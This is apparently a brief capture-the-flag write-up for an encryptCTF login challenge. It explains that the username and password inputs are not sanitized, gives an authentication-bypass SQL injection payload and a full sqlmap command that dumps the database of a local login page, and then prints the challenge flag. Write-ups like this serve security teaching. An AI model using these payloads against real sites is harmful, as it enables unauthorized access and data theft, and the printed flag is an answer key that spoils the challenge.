* putting random inputs in username and password fields sometimes result in db errors
* looks like inputs aren't sanitized properly before being put in a database query

Two possible solutions:
 1. Manual injection:
   * Username: `admin`
   * Password: `' OR ''='`
 2. Lazy way:
   * Just run `sqlmap -u 127.0.0.1:9090/login.php --data="username=admin&password=pass&submit=submit" -p username --dump --time-sec 1 --batch --answer="crack=n"`

## Flag
```
encryptCTF{i_H4t3_inJ3c7i0n5}
```
